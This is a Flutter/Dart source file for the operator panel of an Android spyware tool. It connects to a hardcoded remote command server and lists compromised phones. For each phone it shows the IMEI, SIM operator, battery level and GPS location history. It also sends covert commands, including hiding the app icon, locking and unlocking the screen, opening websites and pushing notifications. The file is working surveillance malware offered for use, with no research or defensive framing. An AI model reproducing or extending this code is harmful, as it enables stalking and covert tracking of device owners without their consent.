import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

const String SERVER_URL = "http://fajzz-hosting.kalzzptero.my.id:25582";

class SpywarePage extends StatefulWidget {
  final String sessionKey;
  final String username;
  const SpywarePage({super.key, required this.sessionKey, required this.username});

  @override
  State<SpywarePage> createState() => _SpywarePageState();
}

class _SpywarePageState extends State<SpywarePage> {
  final Color primaryRed = const Color(0xFFE53935);
  final Color darkBg = const Color(0xFF1A1A1A);
  final Color cardBg = const Color(0xFF2D2D2D);
  final Color textWhite = const Color(0xFFFFFFFF);
  final Color textGray = const Color(0xFF9E9E9E);
  
  List<dynamic> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  Map<String, dynamic> _deviceInfo = {};
  List<dynamic> _locations = [];
  Map<String, dynamic>? _lastLocation;
  Map<String, dynamic> _batteryInfo = {};
  
  bool _isLoading = true;
  bool _isShowingDeviceDetail = false;
  String? _commandResponse;
  int _selectedTabIndex = 0;

  final TextEditingController _urlController = TextEditingController();
  final TextEditingController _titleController = TextEditingController();
  final TextEditingController _msgController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _fetchDevices();
  }

  Future<void> _fetchDevices() async {
    setState(() => _isLoading = true);
    try {
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/spyware/devices?username=${widget.username}'),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        setState(() {
          _devices = json.decode(response.body);
          _isLoading = false;
        });
      } else {
        setState(() => _isLoading = false);
      }
    } catch (e) {
      setState(() => _isLoading = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchDeviceInfo(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/spyware/device/info?device=$deviceId'),
      );
      if (response.statusCode == 200) setState(() => _deviceInfo = json.decode(response.body));
    } catch (e) {}
  }

  Future<void> _fetchLocations(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/spyware/location/get?device=$deviceId&limit=20'),
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        setState(() {
          _locations = data['locations'] ?? [];
          _lastLocation = data['last_location'];
        });
      }
    } catch (e) {}
  }

  Future<void> _fetchBattery(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$SERVER_URL/api/spyware/battery/get?device=$deviceId'),
      );
      if (response.statusCode == 200) setState(() => _batteryInfo = json.decode(response.body));
    } catch (e) {}
  }

  Future<void> _sendCommand(String deviceId, String command, [String? extra]) async {
    try {
      String url = '$SERVER_URL/api/spyware/$command?device=$deviceId&username=${widget.username}';
      if (extra != null) url += '&$extra';
      
      final response = await http.get(Uri.parse(url)).timeout(const Duration(seconds: 10));
      if (response.statusCode == 200) {
        setState(() => _commandResponse = '✓ Command sent');
        _showSuccessSnackbar('Command sent');
      }
    } catch (e) {
      _showErrorSnackbar('Failed: $e');
    }
  }

  void _showOpenWebDialog(String deviceId) {
    _urlController.clear();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text('Open Website', style: TextStyle(color: Colors.white)),
        content: TextField(
          controller: _urlController,
          style: TextStyle(color: textWhite),
          decoration: InputDecoration(
            hintText: 'https://...', 
            hintStyle: TextStyle(color: textGray),
            enabledBorder: OutlineInputBorder(
              borderSide: BorderSide(color: textGray.withOpacity(0.3)),
            ),
            focusedBorder: OutlineInputBorder(
              borderSide: BorderSide(color: primaryRed),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context), 
            child: const Text('Cancel', style: TextStyle(color: Colors.white)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              if (_urlController.text.isNotEmpty) _sendCommand(deviceId, 'openweb', 'url=${Uri.encodeComponent(_urlController.text)}');
            },
            style: ElevatedButton.styleFrom(backgroundColor: primaryRed),
            child: const Text('Open Website'),
          ),
        ],
      ),
    );
  }

  void _showNotificationDialog(String deviceId) {
    _titleController.clear();
    _msgController.clear();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text('Send Notification', style: TextStyle(color: Colors.white)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _titleController, 
              style: TextStyle(color: textWhite),
              decoration: InputDecoration(
                labelText: 'Title',
                labelStyle: TextStyle(color: textGray),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: textGray.withOpacity(0.3)),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryRed),
                ),
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: _msgController, 
              style: TextStyle(color: textWhite), 
              maxLines: 3, 
              decoration: InputDecoration(
                labelText: 'Message',
                labelStyle: TextStyle(color: textGray),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: textGray.withOpacity(0.3)),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryRed),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context), 
            child: const Text('Cancel', style: TextStyle(color: Colors.white)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand(deviceId, 'show_notif', 'title=${Uri.encodeComponent(_titleController.text)}&message=${Uri.encodeComponent(_msgController.text)}');
            },
            style: ElevatedButton.styleFrom(backgroundColor: primaryRed),
            child: const Text('Send Notification'),
          ),
        ],
      ),
    );
  }

  void _showDeviceDetail(Map<String, dynamic> device) {
    setState(() {
      _selectedDevice = device;
      _isShowingDeviceDetail = true;
      _selectedTabIndex = 0;
    });
    _fetchDeviceInfo(device['device_id']);
    _fetchLocations(device['device_id']);
    _fetchBattery(device['device_id']);
  }

  void _showSuccessSnackbar(String msg) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg), backgroundColor: Colors.green));
  void _showErrorSnackbar(String msg) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg), backgroundColor: primaryRed));

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      appBar: AppBar(
        title: Row(children: [
          Text("SPY", style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold, fontSize: 20)), 
          Text("WARE", style: TextStyle(color: textWhite, fontSize: 20))
        ]),
        backgroundColor: darkBg,
        leading: IconButton(
          icon: Icon(Icons.arrow_back, color: primaryRed), 
          onPressed: () => _isShowingDeviceDetail ? setState(() => _isShowingDeviceDetail = false) : Navigator.pop(context)
        ),
        actions: [
          if (!_isShowingDeviceDetail) 
            IconButton(
              icon: Icon(Icons.refresh, color: primaryRed), 
              onPressed: _fetchDevices
            )
        ].whereType<Widget>().toList(),
      ),
      body: _isLoading
          ? Center(child: CircularProgressIndicator(color: primaryRed))
          : _isShowingDeviceDetail
              ? _buildDeviceDetail()
              : _buildDeviceList(),
    );
  }

  Widget _buildDeviceList() {
    if (_devices.isEmpty) {
      return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        Icon(Icons.devices_other, size: 80, color: primaryRed.withOpacity(0.3)),
        const SizedBox(height: 16),
        Text('No Spyware Devices', style: TextStyle(color: textWhite, fontSize: 18)),
        const SizedBox(height: 8),
        Text('Waiting for devices...', style: TextStyle(color: textGray)),
      ]));
    }

    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _devices.length,
      itemBuilder: (context, index) {
        final device = _devices[index];
        final isOnline = device['online'] == true;
        return GestureDetector(
          onTap: () => _showDeviceDetail(device),
          child: Container(
            margin: const EdgeInsets.only(bottom: 16),
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: isOnline ? primaryRed : textGray.withOpacity(0.3), width: isOnline ? 2 : 1),
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: isOnline ? primaryRed.withOpacity(0.2) : textGray.withOpacity(0.1), 
                    borderRadius: BorderRadius.circular(12)
                  ),
                  child: Icon(Icons.phone_android, color: isOnline ? primaryRed : textGray),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(device['model'] ?? 'Unknown', style: TextStyle(color: textWhite, fontWeight: FontWeight.bold, fontSize: 16)),
                      const SizedBox(height: 4),
                      Row(children: [
                        Container(width: 8, height: 8, decoration: BoxDecoration(color: isOnline ? Colors.green : textGray, shape: BoxShape.circle)),
                        const SizedBox(width: 8),
                        Text(isOnline ? 'ONLINE' : 'OFFLINE', style: TextStyle(color: isOnline ? Colors.green : textGray, fontSize: 10)),
                        const SizedBox(width: 8),
                        Text('BAT: ${device['battery'] ?? 0}%', style: TextStyle(color: textGray, fontSize: 10)),
                      ]),
                    ],
                  ),
                ),
                Icon(Icons.chevron_right, color: isOnline ? primaryRed : textGray),
              ],
            ),
          ),
        );
      },
    );
  }

  Widget _buildDeviceDetail() {
    if (_selectedDevice == null) return const SizedBox();
    final device = _selectedDevice!;
    final isOnline = device['online'] == true;
    final deviceId = device['device_id'];

    return Column(
      children: [
        Container(
          padding: const EdgeInsets.all(20),
          color: cardBg,
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(15), 
                decoration: BoxDecoration(
                  color: primaryRed.withOpacity(0.2), 
                  borderRadius: BorderRadius.circular(20)
                ),
                child: Icon(Icons.phone_android, size: 30, color: primaryRed)
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(device['model'] ?? 'Unknown', style: TextStyle(color: textWhite, fontSize: 16, fontWeight: FontWeight.bold)),
                    Text(deviceId, style: TextStyle(color: textGray, fontSize: 10)),
                    const SizedBox(height: 8),
                    Row(children: [
                      Icon(Icons.battery_charging_full, color: Colors.green, size: 14),
                      const SizedBox(width: 4),
                      Text('${device['battery'] ?? 0}%', style: TextStyle(color: Colors.green)),
                    ]),
                  ],
                ),
              ),
            ],
          ),
        ),
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
          padding: const EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: cardBg, 
            borderRadius: BorderRadius.circular(30), 
            border: Border.all(color: primaryRed.withOpacity(0.3))
          ),
          child: Row(children: [
            _tabButton(0, Icons.info, 'INFO'), 
            _tabButton(1, Icons.settings, 'CONTROL'), 
            _tabButton(2, Icons.location_on, 'LOCATION')
          ]),
        ),
        Expanded(
          child: IndexedStack(
            index: _selectedTabIndex,
            children: [
              _buildInfoTab(device), 
              _buildControlTab(deviceId, isOnline), 
              _buildLocationTab(),
            ],
          ),
        ),
      ],
    );
  }

  Widget _tabButton(int index, IconData icon, String label) {
    final isSelected = _selectedTabIndex == index;
    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _selectedTabIndex = index),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
            color: isSelected ? primaryRed : Colors.transparent, 
            borderRadius: BorderRadius.circular(30)
          ),
          child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
            Icon(icon, color: isSelected ? Colors.white : textGray, size: 18),
            const SizedBox(width: 6),
            Text(label, style: TextStyle(color: isSelected ? Colors.white : textGray)),
          ]),
        ),
      ),
    );
  }

  Widget _buildInfoTab(Map<String, dynamic> device) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _infoCard('DEVICE', Icons.phone_android, [
            _infoRow('Device ID', device['device_id'] ?? 'N/A'),
            _infoRow('Model', _deviceInfo['model'] ?? device['model'] ?? 'Unknown'),
            _infoRow('Android', _deviceInfo['android_version'] ?? device['android_version'] ?? 'Unknown'),
          ]),
          const SizedBox(height: 12),
          _infoCard('SYSTEM', Icons.settings, [
            _infoRow('RAM', _formatBytes(_deviceInfo['ram_total'] ?? device['ram_total'] ?? 0)),
            _infoRow('Battery', '${device['battery'] ?? 0}%'),
            _infoRow('Charging', device['charging'] == true ? 'Yes' : 'No'),
          ]),
          const SizedBox(height: 12),
          _infoCard('NETWORK', Icons.wifi, [
            _infoRow('IMEI', _deviceInfo['imei'] ?? device['imei'] ?? 'N/A'),
            _infoRow('SIM', _deviceInfo['sim_operator'] ?? device['sim_operator'] ?? 'Unknown'),
            _infoRow('Last Seen', _formatDate(device['last_seen'])),
          ]),
        ],
      ),
    );
  }

  Widget _infoCard(String title, IconData icon, List<Widget> children) {
    return Container(
      width: double.infinity, 
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardBg, 
        borderRadius: BorderRadius.circular(20), 
        border: Border.all(color: primaryRed.withOpacity(0.3))
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Icon(icon, color: primaryRed, size: 18), 
          const SizedBox(width: 8), 
          Text(title, style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold))
        ]),
        const SizedBox(height: 12), 
        ...children,
      ]),
    );
  }

  Widget _infoRow(String label, String value) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 4),
    child: Row(children: [
      SizedBox(width: 80, child: Text(label, style: TextStyle(color: textGray, fontSize: 12))),
      Expanded(child: Text(value, style: TextStyle(color: textWhite, fontSize: 12))),
    ]),
  );

  Widget _buildControlTab(String deviceId, bool isOnline) {
    if (!isOnline) return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      Icon(Icons.wifi_off, size: 64, color: textGray), 
      const SizedBox(height: 16),
      Text('Device Offline', style: TextStyle(color: textWhite, fontSize: 16)),
      const SizedBox(height: 8),
      Text('Cannot send commands to offline device', style: TextStyle(color: textGray, fontSize: 12)),
    ]));

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _controlGroup('SCREEN CONTROL', Icons.lock, [
            _controlBtn('Lock Screen', Icons.lock, () => _sendCommand(deviceId, 'lock')),
            _controlBtn('Unlock Screen', Icons.lock_open, () => _sendCommand(deviceId, 'unlock')),
          ]),
          const SizedBox(height: 12),
          _controlGroup('FLASHLIGHT CONTROL', Icons.flash_on, [
            _controlBtn('Flashlight ON', Icons.flash_on, () => _sendCommand(deviceId, 'flashlight_on')),
            _controlBtn('Flashlight OFF', Icons.flash_off, () => _sendCommand(deviceId, 'flashlight_off')),
          ]),
          const SizedBox(height: 12),
          _controlGroup('APP CONTROL', Icons.apps, [
            _controlBtn('Hide App Icon', Icons.visibility_off, () => _sendCommand(deviceId, 'app/hide')),
            _controlBtn('Show App Icon', Icons.visibility, () => _sendCommand(deviceId, 'app/show')),
          ]),
          const SizedBox(height: 12),
          _controlGroup('MUSIC CONTROL', Icons.music_note, [
            _controlBtn('Play Music', Icons.play_arrow, () => _sendCommand(deviceId, 'music/play?url=https://example.com/music.mp3')),
            _controlBtn('Stop Music', Icons.stop, () => _sendCommand(deviceId, 'music/stop')),
          ]),
          const SizedBox(height: 12),
          _controlGroup('WEB CONTROL', Icons.public, [
            _controlBtn('Open Website', Icons.open_in_browser, () => _showOpenWebDialog(deviceId)),
          ]),
          const SizedBox(height: 12),
          _controlGroup('NOTIFICATION CONTROL', Icons.notifications, [
            _controlBtn('Send Notification', Icons.notifications_active, () => _showNotificationDialog(deviceId)),
          ]),
          if (_commandResponse != null) ...[
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.all(12), 
              decoration: BoxDecoration(
                color: Colors.green.withOpacity(0.2), 
                borderRadius: BorderRadius.circular(12)
              ),
              child: Row(children: [
                Icon(Icons.check_circle, color: Colors.green), 
                const SizedBox(width: 8),
                Expanded(child: Text(_commandResponse!, style: TextStyle(color: textWhite))),
                IconButton(
                  icon: Icon(Icons.close, size: 16, color: textGray), 
                  onPressed: () => setState(() => _commandResponse = null),
                ),
              ]),
            ),
          ],
        ],
      ),
    );
  }

  Widget _controlGroup(String title, IconData icon, List<Widget> buttons) {
    return Container(
      decoration: BoxDecoration(
        color: cardBg, 
        borderRadius: BorderRadius.circular(16), 
        border: Border.all(color: primaryRed.withOpacity(0.3))
      ),
      child: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(12), 
            child: Row(children: [
              Icon(icon, color: primaryRed, size: 18), 
              const SizedBox(width: 8), 
              Text(title, style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold))
            ])
          ),
          const Divider(color: Colors.white24),
          Padding(
            padding: const EdgeInsets.all(12), 
            child: Wrap(spacing: 8, runSpacing: 8, children: buttons),
          ),
        ],
      ),
    );
  }

  Widget _controlBtn(String label, IconData icon, VoidCallback onPressed) {
    return ElevatedButton.icon(
      onPressed: onPressed, 
      icon: Icon(icon, size: 18), 
      label: Text(label, style: const TextStyle(fontSize: 13)),
      style: ElevatedButton.styleFrom(
        backgroundColor: primaryRed, 
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(8),
        ),
      ),
    );
  }

  Widget _buildLocationTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg, 
              borderRadius: BorderRadius.circular(16), 
              border: Border.all(color: Colors.blue.withOpacity(0.3))
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(children: [
                  Icon(Icons.location_on, color: Colors.blue), 
                  const SizedBox(width: 8), 
                  Text('LAST LOCATION', style: TextStyle(color: Colors.blue, fontWeight: FontWeight.bold))
                ]),
                const SizedBox(height: 16),
                if (_lastLocation != null) ...[
                  _locDetail('Latitude', _lastLocation!['lat'].toStringAsFixed(6)),
                  _locDetail('Longitude', _lastLocation!['lng'].toStringAsFixed(6)),
                  _locDetail('Accuracy', '±${_lastLocation!['accuracy']}m'),
                  _locDetail('Timestamp', _formatDate(_lastLocation!['timestamp'])),
                ] else Center(child: Text('No location data', style: TextStyle(color: textGray))),
              ],
            ),
          ),
          const SizedBox(height: 12),
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg, 
              borderRadius: BorderRadius.circular(16), 
              border: Border.all(color: Colors.green.withOpacity(0.3))
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(children: [
                  Icon(Icons.battery_charging_full, color: Colors.green), 
                  const SizedBox(width: 8), 
                  Text('BATTERY STATUS', style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold))
                ]),
                const SizedBox(height: 16),
                if (_batteryInfo.isNotEmpty) ...[
                  Center(
                    child: Column(children: [
                      Text('${_batteryInfo['battery'] ?? 0}%', 
                        style: TextStyle(color: textWhite, fontSize: 32, fontWeight: FontWeight.bold)
                      ),
                      const SizedBox(height: 8),
                      Container(
                        width: 200,
                        height: 8,
                        decoration: BoxDecoration(
                          color: Colors.grey[800],
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: FractionallySizedBox(
                          alignment: Alignment.centerLeft,
                          widthFactor: (_batteryInfo['battery'] ?? 0) / 100,
                          child: Container(
                            decoration: BoxDecoration(
                              color: Colors.green,
                              borderRadius: BorderRadius.circular(4),
                            ),
                          ),
                        ),
                      ),
                    ]),
                  ),
                  const SizedBox(height: 12),
                  _infoRow('Charging', _batteryInfo['charging'] == true ? 'Yes' : 'No'),
                  _infoRow('Level', '${_batteryInfo['battery'] ?? 0}%'),
                ] else Center(child: Text('No battery data', style: TextStyle(color: textGray))),
              ],
            ),
          ),
          if (_locations.isNotEmpty) ...[
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg, 
                borderRadius: BorderRadius.circular(16), 
                border: Border.all(color: Colors.purple.withOpacity(0.3))
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(children: [
                    Icon(Icons.history, color: Colors.purple), 
                    const SizedBox(width: 8), 
                    Text('LOCATION HISTORY (${_locations.length})', 
                      style: TextStyle(color: Colors.purple, fontWeight: FontWeight.bold)
                    ),
                  ]),
                  const SizedBox(height: 12),
                  ..._locations.take(5).map((loc) => Padding(
                    padding: const EdgeInsets.only(bottom: 12),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(children: [
                          Icon(Icons.location_on, color: Colors.purple, size: 12), 
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              '${loc['lat'].toStringAsFixed(6)}, ${loc['lng'].toStringAsFixed(6)}', 
                              style: TextStyle(color: textWhite, fontSize: 12)
                            ),
                          ),
                        ]),
                        Padding(
                          padding: const EdgeInsets.only(left: 20),
                          child: Text(
                            _formatDate(loc['timestamp']),
                            style: TextStyle(color: textGray, fontSize: 10),
                          ),
                        ),
                      ],
                    ),
                  )).toList(),
                  if (_locations.length > 5)
                    Padding(
                      padding: const EdgeInsets.only(top: 8),
                      child: Center(
                        child: Text('+ ${_locations.length - 5} more locations', 
                          style: TextStyle(color: textGray, fontSize: 11)
                        ),
                      ),
                    ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _locDetail(String label, String value) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 4),
    child: Row(children: [
      SizedBox(width: 80, child: Text(label, style: TextStyle(color: textGray, fontSize: 12))),
      Expanded(child: Text(value, style: TextStyle(color: textWhite, fontSize: 12, fontWeight: FontWeight.bold))),
    ]),
  );

  String _formatBytes(int bytes) {
    if (bytes == 0) return 'Unknown';
    if (bytes < 1024) return '$bytes B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    return '${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB';
  }

  String _formatDate(String? dateStr) {
    if (dateStr == null) return 'Unknown';
    try {
      final date = DateTime.parse(dateStr);
      final diff = DateTime.now().difference(date);
      if (diff.inDays > 0) return '${diff.inDays}d ago';
      if (diff.inHours > 0) return '${diff.inHours}h ago';
      if (diff.inMinutes > 0) return '${diff.inMinutes}m ago';
      return 'Just now';
    } catch (e) {
      return dateStr;
    }
  }
}
